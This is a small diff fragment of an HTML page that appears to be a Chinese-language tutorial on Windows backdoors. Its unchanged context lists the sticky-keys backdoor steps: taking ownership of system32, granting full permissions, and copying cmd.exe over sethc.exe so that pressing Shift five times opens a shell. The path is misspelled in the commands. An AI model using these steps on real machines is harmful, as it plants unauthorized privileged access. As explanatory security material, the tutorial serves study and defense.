@@ -102,7 +102,6 @@
 <p>​        最底下：默认以管理员权限运行</p>
 <p>粘滞键后门：</p>
 <p>​    原理：通过覆盖sethc.exe文件运行cmd</p>
-<p>​    </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. takeown &#x2F;F c:\windwos\system32\* &#x2F;A &#x2F;R</span><br><span class="line"></span><br><span class="line">2.cacls c:\windwos\system32\\* &#x2F;T &#x2F;E &#x2F;G administrators:F</span><br><span class="line"></span><br><span class="line">3.copy cmd.exe sethc.exe</span><br><span class="line"></span><br><span class="line">4.连续按5次shift键呼出cmd</span><br></pre></td></tr></table></figure>
 
 
